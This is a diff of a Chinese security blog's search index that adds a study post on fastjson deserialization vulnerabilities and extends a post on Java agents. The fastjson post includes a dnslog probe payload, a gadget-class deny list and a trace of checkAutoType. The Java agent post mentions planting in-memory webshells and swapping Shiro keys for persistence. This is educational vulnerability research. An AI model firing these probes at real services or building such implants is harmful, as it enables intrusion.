@@ -295,6 +295,118 @@
       </tags>
   </entry>
   <entry>
+    <title>fastjson 反序列化</title>
+    <url>//Fastjson1.html</url>
+    <content><![CDATA[<p>fastjson 历史漏洞的复现，调试，学习</p>
+<a id="more"></a>
+
+
+
+<h1 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将<code>Java Bean</code>序列化为JSON字符串，也可以从JSON字符串反序列化到<code>JavaBean</code></p>
+<blockquote>
+<p>  题外话：之前看到有篇微博说有三个东西养活了大部分的安全人员，第三个就说是fastjson</p>
+</blockquote>
+<h2 id="反序列化史"><a href="#反序列化史" class="headerlink" title="反序列化史"></a>反序列化史</h2><p>从<code>v1.2.24</code>的漏洞公布以来，fastjson对于漏洞的修复大多数只是增加了黑名单，对于黑名单，大师傅们有一套成熟的bypass体系（</p>
+<h3 id="1-2-24"><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h3><p>对于1.2.24以及之前的版本，fastjson没有做任何的防护措施，很容易的就被反序列化链攻击。</p>
+<h3 id="1-2-25"><a href="#1-2-25" class="headerlink" title="1.2.25"></a>1.2.25</h3><p>在1.2.25版本加入了<code>checkAutoType</code>函数，其中有个<code>autoTypeSupport</code>默认为<code>False</code>。</p>
+<ul>
+<li>  当<code>autoTypeSupport</code>为<code>False</code>时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错。</li>
+<li>  当<code>autoTypeSupport</code>为<code>True</code>时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤。对于开启或者不开启，都有相应的绕过方法。</li>
+</ul>
+<p>黑名单如下</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] denyList = <span class="string">&quot;</span></span><br><span class="line"><span class="string">bsh,</span></span><br><span class="line"><span class="string">com.mchange,com.sun.,</span></span><br><span class="line"><span class="string">java.lang.Thread,</span></span><br><span class="line"><span class="string">java.net.Socket,</span></span><br><span class="line"><span class="string">java.rmi,</span></span><br><span class="line"><span class="string">javax.xml,</span></span><br><span class="line"><span class="string">org.apache.bcel,</span></span><br><span class="line"><span class="string">org.apache.commons.beanutils,</span></span><br><span class="line"><span class="string">org.apache.commons.collections.Transformer,</span></span><br><span class="line"><span class="string">org.apache.commons.collections.functors,</span></span><br><span class="line"><span class="string">org.apache.commons.collections4.comparators,</span></span><br><span class="line"><span class="string">org.apache.commons.fileupload,</span></span><br><span class="line"><span class="string">org.apache.myfaces.context.servlet,</span></span><br><span class="line"><span class="string">org.apache.tomcat,org.apache.wicket.util,</span></span><br><span class="line"><span class="string">org.codehaus.groovy.runtime,</span></span><br><span class="line"><span class="string">org.hibernate,org.jboss,</span></span><br><span class="line"><span class="string">org.mozilla.javascript,</span></span><br><span class="line"><span class="string">org.python.core,</span></span><br><span class="line"><span class="string">org.springframework&quot;</span>.split(<span class="string">&quot;,&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>可以看到还是非常全面的（大概）</p>
+<p>而后的版本大多都是在黑名单里斗智斗勇，当然，也有一些其他的变化。</p>
+<h2 id="稍稍小分析"><a href="#稍稍小分析" class="headerlink" title="稍稍小分析"></a>稍稍小分析</h2><h3 id="小栗子1——test"><a href="#小栗子1——test" class="headerlink" title="小栗子1——test"></a>小栗子1——test</h3><p>只有<code>@type</code>的情况</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shiroha.demos;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String str = <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;: \&quot;java.lang.String\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSONObject object = JSON.parseObject(str);</span><br><span class="line">        System.out.println(object.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在<code>JSON.parseObject()</code>方法经过一系列调用之后（调用栈如下）</p>
+<p><img src="https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210501100552853.png" alt="image-20210501100552853"></p>
+<p>到达如下位置（320行）</p>
+<p><img src="https://gitee.com/ethustdout/pic2/raw/master/uPic/Ve0AgC.png" alt="Ve0AgC"></p>
+<p>满足if的条件（<code>key == @type</code>）</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// DefaultJSONParser$parseObject: 320</span></span><br><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">	......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>语法分析器解析了<code>@type</code>字段的字符串，并转化为类名</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// DefaultJSONParser$parseObject: 321</span></span><br><span class="line">String typeName = lexer.scanSymbol(symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt; clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());</span><br></pre></td></tr></table></figure>
+
+<p>当clazz不为null的时候，继续解析语法，判断是否还有字段。<code>lexer.nextToken(JSONToken.COMMA)</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// DefaultJSONParser$parseObject: 324</span></span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">	object.put(JSON.DEFAULT_TYPE_KEY, typeName);</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">lexer.nextToken(JSONToken.COMMA);</span><br><span class="line"></span><br><span class="line"><span class="comment">// JSONLexerBase.java$nextToken: 242</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">nextToken</span><span class="params">(<span class="keyword">int</span> expect)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (expect) &#123;</span><br><span class="line">            <span class="keyword">case</span> JSONToken.COMMA:</span><br><span class="line">                <span class="keyword">if</span> (ch == <span class="string">&#x27;&#125;&#x27;</span>) &#123;</span><br><span class="line">                    token = JSONToken.RBRACE;</span><br><span class="line">                    next();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当没有字段的时候，进入了if，创建一个实例<code>instance = clazz.newInstance()</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// DefaultJSONParser$parseObject: 330</span></span><br><span class="line"><span class="keyword">if</span> (lexer.token() == JSONToken.RBRACE) &#123;</span><br><span class="line">	lexer.nextToken(JSONToken.COMMA);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Object instance = <span class="keyword">null</span>;</span><br><span class="line">        ObjectDeserializer deserializer = <span class="keyword">this</span>.config.getDeserializer(clazz);</span><br><span class="line">        <span class="keyword">if</span> (deserializer <span class="keyword">instanceof</span> JavaBeanDeserializer) &#123;</span><br><span class="line">            instance = ((JavaBeanDeserializer) deserializer).createInstance(<span class="keyword">this</span>, clazz);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz == Cloneable.class) &#123;</span><br><span class="line">                instance = <span class="keyword">new</span> HashMap();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;java.util.Collections$EmptyMap&quot;</span>.equals(typeName)) &#123;</span><br><span class="line">                instance = Collections.emptyMap();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                instance = clazz.newInstance();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;create instance error&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>于此结束。</p>
+<h3 id="小栗子2——dnslog-poc"><a href="#小栗子2——dnslog-poc" class="headerlink" title="小栗子2——dnslog poc"></a>小栗子2——dnslog poc</h3><p>常见的dnslog探测poc</p>
+<h4 id="Version-1-2-24"><a href="#Version-1-2-24" class="headerlink" title="Version 1.2.24"></a>Version 1.2.24</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shiroha.demos;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String str = <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;: \&quot;java.net.Inet4Address\&quot;, &quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;val\&quot;: \&quot;hello.frkukf.dnslog.cn\&quot;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSONObject object = JSON.parseObject(str);</span><br><span class="line">        System.out.println(object.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直到<code>lexer.nextToken(JSONToken.COMMA)</code>为止都和上面一样。</p>
+<p>由于在<code>@type</code>字段之后，还有一个<code>val</code>字段，所以在<code>lexer.nextToken()</code>函数返回的不是<code>JSONToken.RBRACE</code>，而是<code>JSONToken.COMMA</code>，也就进不到 if 语句中。</p>
+<p>运行到 367 行时，会调用 <code>config.getDeserializer(clazz)</code>，根据<code>clazz</code>找到对应的反序列化对象解析器</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// DefaultJSONParser$parseObject: 367</span></span><br><span class="line">ObjectDeserializer deserializer = config.getDeserializer(clazz);</span><br><span class="line"><span class="keyword">return</span> deserializer.deserialze(<span class="keyword">this</span>, clazz, fieldName);</span><br></pre></td></tr></table></figure>
+
+<p>在<code>config.getDeserializer(clazz)</code>函数中，调用<code>this.derializers.get(type)</code>来找反序列化解析器</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ParserConfig$getDeserializer: 305</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ObjectDeserializer <span class="title">getDeserializer</span><span class="params">(Type type)</span> </span>&#123;</span><br><span class="line">    ObjectDeserializer derializer = <span class="keyword">this</span>.derializers.get(type);</span><br><span class="line">    <span class="keyword">if</span> (derializer != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> derializer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个<code>this.derializers</code>是一个<code>IdentityHashMap</code>，其中与<code>java.net.Inet4adreess</code>对应的是<code>MiscCodec</code>解析器</p>
+<p><img src="https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210501105842685.png" alt="image-20210501105842685"></p>
+<p>在<code>MiscCodec$deserialze()</code>函数中，会根据类的名字选择相应的解析方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//MiscCodec$deserialze: 170</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">deserialze</span><span class="params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// line: 299</span></span><br><span class="line">    <span class="keyword">if</span> (clazz == InetAddress.class || clazz == Inet4Address.class || clazz == Inet6Address.class) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (T) InetAddress.getByName(strVal);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownHostException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;deserialize inet adress error&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在line: 301 <code>InetAddress.getByName()</code>触发dns查询。</p>
+<p>这个<code>strVal</code>对象由前面的<code>objVal</code>变化而来</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// line: 241</span></span><br><span class="line"><span class="keyword">if</span> (objVal == <span class="keyword">null</span>) &#123;</span><br><span class="line">    strVal = <span class="keyword">null</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (objVal <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">    strVal = (String) objVal;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而<code>objVal</code>由解析器解析</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// line: 215</span></span><br><span class="line">Object objVal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;</span><br><span class="line">    parser.resolveStatus = DefaultJSONParser.NONE;</span><br><span class="line">    parser.accept(JSONToken.COMMA);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">&quot;val&quot;</span>.equals(lexer.stringVal())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        lexer.nextToken();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    parser.accept(JSONToken.COLON);</span><br><span class="line"></span><br><span class="line">    objVal = parser.parse();</span><br><span class="line"></span><br><span class="line">    parser.accept(JSONToken.RBRACE);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    objVal = parser.parse();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="checkAutoType"><a href="#checkAutoType" class="headerlink" title="checkAutoType"></a>checkAutoType</h3><h4 id="java-net-Inet4Address"><a href="#java-net-Inet4Address" class="headerlink" title="java.net.Inet4Address"></a>java.net.Inet4Address</h4><p>在 1.2.24 之后，最主要的问题就是加入了 <code>checkAutoType()</code>函数</p>
+<p>这里以 <code>1.2.67</code> 为例</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// DefaultJSONParser$parseObject: 332</span></span><br><span class="line"><span class="keyword">if</span> (!allDigits) &#123;</span><br><span class="line">    clazz = config.checkAutoType(typeName, <span class="keyword">null</span>, lexer.getFeatures());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ParserConfig$checkAutoType: 1196 </span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="keyword">int</span> features) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>来逐步分析一下这个函数。</p>
+<p>首先检查合法性：</p>
+<ol>
+<li> 不为 null</li>
+<li> 长度在 3～192 之间</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ParserConfig$checkAutoType: 1197 - 1221</span></span><br><span class="line"><span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (typeName.length() &gt;= <span class="number">192</span> || typeName.length() &lt; <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">boolean</span> expectClassFlag;</span><br><span class="line"><span class="comment">// 传入的参数 exceptClass 为 null 。</span></span><br><span class="line"><span class="keyword">if</span> (expectClass == <span class="keyword">null</span>) &#123;</span><br><span class="line">    expectClassFlag = <span class="keyword">false</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>而后，根据某种算法进行黑名单过滤、内部白名单过滤。</p>
+<p>对于白名单，在之前使用的是 <code>Class</code> 对象，而现在用了他的 <code>hashcodes</code> ，说明开发者并不想让人知道到底哪些是白名单。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">long</span> h1 = (BASIC ^ className.charAt(<span class="number">0</span>)) * PRIME;</span><br><span class="line"><span class="keyword">if</span> (h1 == <span class="number">0xaf64164c86024f1aL</span>) &#123; <span class="comment">// [</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((h1 ^ className.charAt(className.length() - <span class="number">1</span>)) * PRIME == <span class="number">0x9198507b5af98f0L</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">long</span> h3 = (((((BASIC ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">        * PRIME)</span><br><span class="line">        ^ className.charAt(<span class="number">1</span>))</span><br><span class="line">        * PRIME)</span><br><span class="line">        ^ className.charAt(<span class="number">2</span>))</span><br><span class="line">        * PRIME;</span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> fullHash = TypeUtils.fnv1a_64(className);</span><br><span class="line"><span class="keyword">boolean</span> internalWhite = Arrays.binarySearch(INTERNAL_WHITELIST_HASHCODES,  fullHash) &gt;= <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
+
+<p>如果是在白名单内，也就是 <code>internalWhite == true</code> 的情况，会在下面直接 <code>loadClass</code>，也就没了一堆过滤保护措施。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// line: 1290</span></span><br><span class="line"><span class="keyword">if</span> (internalWhite) &#123;</span><br><span class="line">    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当然 <code>java.net.Inet4Address</code> 这个类并不在 <code>INTERNAL_WHITELIST_HASHCODES</code> 中，继续分析。</p>
+<p>而后就是一个黑名单过滤</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// line: 1248</span></span><br><span class="line"><span class="comment">// 这里 internalDenyHashCodes 默认是 null</span></span><br><span class="line"><span class="keyword">if</span> (internalDenyHashCodes != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">long</span> hash = h3;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">        hash ^= className.charAt(i);</span><br><span class="line">        hash *= PRIME;</span><br><span class="line">        <span class="keyword">if</span> (Arrays.binarySearch(internalDenyHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再之后，去找到这个类（我不太清楚这里为什么需要分三步走分别判断，有理解的师傅可以教教我，感谢）。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// line: 1280-1288</span></span><br><span class="line">clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line"><span class="comment">// java.net.Inet4Address 在这里找到了 clazz</span></span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">    clazz = deserializers.findClass(typeName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">    clazz = typeMapping.get(typeName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据 <code>expectClass</code> 处理 type，由于传递进来的参数是 null ， 因此不触发 if 语句， 直接返回了 <code>clazz</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// line: 1294-1302</span></span><br><span class="line"><span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (expectClass != <span class="keyword">null</span></span><br><span class="line">            &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>顺利通过 <code>checkAutoType</code> 函数 ， 在这之后就和普通的没啥区别了。</p>
+<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><p>未完待续。。。</p>
+]]></content>
+      <categories>
+        <category>JavaWeb</category>
+        <category>ysoserial</category>
+      </categories>
+      <tags>
+        <tag>JavaWeb</tag>
+        <tag>Fastjson</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>URLDNS 分析</title>
     <url>//URLDNS.html</url>
     <content><![CDATA[<p>对<code>ysoserial</code>工具中<code>URLDNS.java</code>利用链分析，跟踪调试。</p>
@@ -384,7 +496,36 @@
 
 
 
-<h1 id="Java-agent"><a href="#Java-agent" class="headerlink" title="Java-agent"></a>Java-agent</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>介绍啥的之后再补吧（</p>
+<h1 id="Java-agent"><a href="#Java-agent" class="headerlink" title="Java-agent"></a>Java-agent</h1><h2 id="解读"><a href="#解读" class="headerlink" title="解读"></a>解读</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><font color='red'>注： 本段参考自<a href="https://developer.aliyun.com/article/2946">JVM源码分析之javaagent原理完全解读</a>， 由于人家写的很好，我只在某些地方加入一些自己的理解。这些地方会使用 蓝色 的字体标注，仅作为学习过程。</font></p>
+<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>本文重点讲述<code>javaagent</code>的具体实现，因为它面向的是我们java程序员，而且<code>agent</code>都是用java编写的，不需要太多的c/c++编程基础，不过这篇文章里也会讲到<code>JVMTIAgent</code>(c实现的)，因为<code>javaagent</code>的运行还是依赖于一个特殊的<code>JVMTIAgent</code>。<font color='blue'>此处的<code>JVMTIagent</code>(JVM Tool Interface)，简单理解就是JVM 暴露给用户的一些扩展接口。更加粗暴点的类似（不负责任举例）就是插件。在下文会有介绍到。</font></p>
+<p>对于javaagent或许大家都听过，甚至使用过，常见的用法大致如下：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -javaagent:myagent.jar=mode=test Test</span><br></pre></td></tr></table></figure>
+
+<p><font color='blue'>java agent使用上有两种方式： 1. 启动时指定 -javaagent:xxx.jar;  2. 运行时指定 attach方法，在下面也有介绍 </font></p>
+<p>我们通过-javaagent来指定我们编写的agent的jar路径（<code>./myagent.jar</code>）及要传给<strong>agent的参数（mode=test）</strong>，这样在启动的时候这个agent就可以做一些我们想要它做的事了。</p>
+<p><code>javaagent</code>的主要的功能如下：</p>
+<ul>
+<li>  可以在<strong>加载java文件之前</strong>做拦截把字节码做修改</li>
+<li>  可以在<strong>运行期将已经加载的类</strong>的字节码做变更，但是这种情况下会有很多的限制，后面会详细说</li>
+<li>还有其他的一些小众的功能<ul>
+<li>  获取所有已经被加载过的类</li>
+<li>  获取所有已经被初始化过了的类（执行过了clinit方法，是上面的一个子集）</li>
+<li>  获取某个对象的大小</li>
+<li>  将某个jar加入到bootstrapclasspath里作为高优先级被bootstrapClassloader加载</li>
+<li>  将某个jar加入到classpath里供AppClassloard去加载</li>
+<li>  设置某些native方法的前缀，主要在查找native方法的时候做规则匹配</li>
+</ul>
+</li>
+</ul>
+<h3 id="JVMTI"><a href="#JVMTI" class="headerlink" title="JVMTI"></a>JVMTI</h3><p><font color='blue'>上文提到的JVMTI（JVM Tool Interface）</font></p>
+<p><a href="http://docs.oracle.com/javase/7/docs/platform/jvmti/jvmti.html">JVMTI</a>全称<code>JVM Tool Interface</code>，是jvm暴露出来的一些供用户扩展的接口集合，JVMTI是基于事件驱动的，JVM每执行到一定的逻辑就会调用一些事件的回调接口（如果有的话），这些接口可以供开发者去扩展自己的逻辑。</p>
+<p>比如说我们最常见的想<strong>在某个类的字节码文件读取之后，类定义之前</strong>能修改相关的字节码，从而使创建的class对象是我们修改之后的字节码内容，那我们就可以实现一个回调函数赋给<code>JvmtiEnv</code>（JVMTI的运行时，通常一个<code>JVMTIAgent</code>对应一个<code>jvmtiEnv</code>，但是也可以对应多个）的回调方法集合里的<code>ClassFileLoadHook</code>，这样在接下来的类文件加载过程中都会调用到这个函数里来了，大致实现如下:</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">jvmtiEventCallbacks callbacks;							</span><br><span class="line">   jvmtiEnv *          jvmtienv = jvmti(agent);			</span><br><span class="line">   jvmtiError          jvmtierror;</span><br><span class="line">   <span class="built_in">memset</span>(&amp;callbacks, <span class="number">0</span>, <span class="keyword">sizeof</span>(callbacks));</span><br><span class="line">   callbacks.ClassFileLoadHook = &amp;eventHandlerClassFileLoadHook;</span><br><span class="line">   jvmtierror = (*jvmtienv)-&gt;SetEventCallbacks( jvmtienv,</span><br><span class="line">                                                &amp;callbacks,</span><br><span class="line">                                                <span class="keyword">sizeof</span>(callbacks));</span><br></pre></td></tr></table></figure>
+
+
+
+<p><font color='blue'>由于本人精力有限，不能一次性更新完成。未完待续。。。</font></p>
+<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>介绍啥的之后再补吧（</p>
 <p>先把代码贴上去，免得忘了</p>
 <p>使用方法有两种：</p>
 <p>由<code>MANIFEST&gt;MF</code>决定（注：<code>:</code>之后一定要有一个空格）</p>
@@ -433,7 +574,9 @@
 
 
 
-<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
+<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><h3 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h3><p>由于<code>Java Agent</code>可以动态操作class字节码，用来植入内存shell也很方便。由于篇幅问题，我会在另一篇文章中写<code>Java agent</code>构造内存马的一种小思路（当然，网上肯定有更好的、一样的、类似的思路，因为我参考了一些现在的内存马）。</p>
+<h3 id="修改特殊数据"><a href="#修改特殊数据" class="headerlink" title="修改特殊数据"></a>修改特殊数据</h3><p>例如 <strong>shiro反序列化时需要用到的key</strong>，使用<code>java agent</code>技术动态的换掉这个key，可以做到类似于权限维持的效果，并且可以阻隔他人的攻击（用于紧急修复也勉强可以？）</p>
+<h3 id="to-be-continued"><a href="#to-be-continued" class="headerlink" title="to be continued"></a>to be continued</h3>]]></content>
       <categories>
         <category>JavaWeb</category>
         <category>java-agent</category>
@@ -762,62 +905,6 @@
       </tags>
   </entry>
   <entry>
-    <title>ciscn初赛-nofree</title>
-    <url>//ciscn_nofree.html</url>
-    <content><![CDATA[<p>2020年国赛 初赛pwn题</p>
-<p>由于我是懒狗，现在才想起来写wp（</p>
-<a id="more"></a>
-
-
-
